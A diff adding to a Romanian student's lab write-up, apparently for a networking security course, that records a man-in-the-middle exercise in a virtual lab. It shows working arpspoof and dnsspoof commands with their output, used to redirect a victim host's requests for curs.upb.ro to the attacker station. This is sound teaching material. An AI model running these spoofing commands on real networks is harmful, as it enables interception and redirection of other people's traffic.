@@ -15,7 +15,25 @@ root@host:~# curl api64.ipify.org ; echo ""
 141.85.150.37
 root@host:~# curl ipinfo.io/ip ; echo ""
 141.85.150.30
+root@host:~$ curl icanhazip.com
+141.85.150.36
 ```
+
+
+```sh
+# Observ ca adresa IP publica poate diferi
+student@host:~$ curl ifconfig.me ; echo ""
+141.85.150.35
+student@host:~$ curl ifconfig.me ; echo ""
+141.85.150.36
+student@host:~$ curl ifconfig.me ; echo ""
+141.85.150.30
+student@host:~$ curl ifconfig.me ; echo ""
+141.85.150.31
+student@host:~$ curl ifconfig.me ; echo ""
+141.85.150.32
+```
+
 
 Pentru a vedea adresa IP publica:
 - `curl ifconfig.me`
@@ -455,5 +473,138 @@ O alta rulare a comenzii `elinks http://192.168.1.2/` imi arata mesajul **Reques
 # Resetam topologia
 root@host:~# start_lab mitm
 ```
+
+
+
+## Task 9 | Rulare **Main in The Midle**
+
+
+> Dupa **Dos**-ul de mai devreme, nu o sa mearga `https://curs.upb.ro/`.
+> E si logic...ca il redirectam la statia **red**, al carui IP este **192.168.1.2/22**.
+> 
+>
+> Am creat un VM nou, **update** si **start** din nou :).
+
+
+```sh
+# In terminalul 1
+root@green:~# elinks http://curs.upb.ro/
+```
+
+
+```sh
+# In terminalul 2
+root@red:~# ip link show
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN mode DEFAULT group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+5: red-eth0@if6: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1450 qdisc noqueue state UP mode DEFAULT group default qlen 1000
+    link/ether 8e:33:20:7c:74:40 brd ff:ff:ff:ff:ff:ff link-netnsid 0
+root@red:~# ip route show default
+default via 192.168.0.100 dev red-eth0 
+root@red:~# arpspoof -i red-eth0 -t 192.168.2.2 192.168.0.100 -r
+8e:33:20:7c:74:40 f6:d7:ed:6f:db:9 0806 42: arp reply 192.168.0.100 is-at 8e:33:20:7c:74:40
+8e:33:20:7c:74:40 2:c8:2b:c:62:d2 0806 42: arp reply 192.168.2.2 is-at 8e:33:20:7c:74:40
+8e:33:20:7c:74:40 f6:d7:ed:6f:db:9 0806 42: arp reply 192.168.0.100 is-at 8e:33:20:7c:74:40
+8e:33:20:7c:74:40 2:c8:2b:c:62:d2 0806 42: arp reply 192.168.2.2 is-at 8e:33:20:7c:74:40
+```
+
+
+```sh
+# In terminalul 3
+root@red:~# ip addr show
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+5: red-eth0@if6: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1450 qdisc noqueue state UP group default qlen 1000
+    link/ether 8e:33:20:7c:74:40 brd ff:ff:ff:ff:ff:ff link-netnsid 0
+    inet 192.168.1.2/22 scope global red-eth0
+       valid_lft forever preferred_lft forever
+root@red:~# ip addr show dev red-eth0
+5: red-eth0@if6: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1450 qdisc noqueue state UP group default qlen 1000
+    link/ether 8e:33:20:7c:74:40 brd ff:ff:ff:ff:ff:ff link-netnsid 0
+    inet 192.168.1.2/22 scope global red-eth0
+       valid_lft forever preferred_lft forever
+```
+
+
+```sh
+# In terminalul 4
+root@green:~# arp -n
+Address                  HWtype  HWaddress           Flags Mask            Iface
+192.168.0.100            ether   8e:33:20:7c:74:40   C                     green-eth0
+192.168.1.2              ether   8e:33:20:7c:74:40   C                     green-eth0
+```
+
+
+```sh
+# In terminalul 4
+root@green:~# ping -c 1 red
+PING red (192.168.1.2) 56(84) bytes of data.
+64 bytes from red (192.168.1.2): icmp_seq=1 ttl=64 time=0.044 ms
+
+--- red ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.044/0.044/0.044/0.000 ms
+```
+
+
+> Observ ca adresa IP a lui **red** este `192.168.1.2`.
+
+```sh
+# In terminalul 4
+root@red:~# touch - hosts
+root@red:~# nano -l hosts
+root@red:~# cat hosts
+192.168.1.2	curs.upb.ro
+```
+
+> Aparent, NU merge daca pun si masca **/22**.
+
+```sh
+# In terminalul 2: Ctrl-C la arpspoof
+```
+
+
+```sh
+# In terminalul 4
+# Mesajele de mai jos vor aparea dupa "arpspoof" (sau nu stiu...am dat mai multe Ctrl-C uri la astea doua pana au mers)
+root@red:~# dnsspoof -f hosts
+dnsspoof: listening on red-eth0 [udp dst port 53 and not src 192.168.1.2]
+192.168.2.2.52850 > 8.8.8.8.53:  49605+ A? curs.upb.ro
+192.168.2.2.52850 > 8.8.8.8.53:  49605+ A? curs.upb.ro
+192.168.2.2.34784 > 8.8.8.8.53:  49605+ A? curs.upb.ro
+```
+
+
+```sh
+# In terminalul 2
+root@red:~# arpspoof -i red-eth0 -t 192.168.2.2 192.168.0.100 -r
+8e:33:20:7c:74:40 f6:d7:ed:6f:db:9 0806 42: arp reply 192.168.0.100 is-at 8e:33:20:7c:74:40
+8e:33:20:7c:74:40 2:c8:2b:c:62:d2 0806 42: arp reply 192.168.2.2 is-at 8e:33:20:7c:74:40
+8e:33:20:7c:74:40 f6:d7:ed:6f:db:9 0806 42: arp reply 192.168.0.100 is-at 8e:33:20:7c:74:40
+8e:33:20:7c:74:40 2:c8:2b:c:62:d2 0806 42: arp reply 192.168.2.2 is-at 8e:33:20:7c:74:40
+8e:33:20:7c:74:40 f6:d7:ed:6f:db:9 0806 42: arp reply 192.168.0.100 is-at 8e:33:20:7c:74:40
+8e:33:20:7c:74:40 2:c8:2b:c:62:d2 0806 42: arp reply 192.168.2.2 is-at 8e:33:20:7c:74:40
+8e:33:20:7c:74:40 f6:d7:ed:6f:db:9 0806 42: arp reply 192.168.0.100 is-at 8e:33:20:7c:74:40
+8e:33:20:7c:74:40 2:c8:2b:c:62:d2 0806 42: arp reply 192.168.2.2 is-at 8e:33:20:7c:74:40
+```
+
+
+Din nou:
+
+
+```sh
+# In terminalul 1
+root@green:~# elinks http://curs.upb.ro/
+```
+
+
+Rezultat:
+
+
+![img](Images/Screenshot%20from%202024-12-12%2009-15-55.png)
 
 
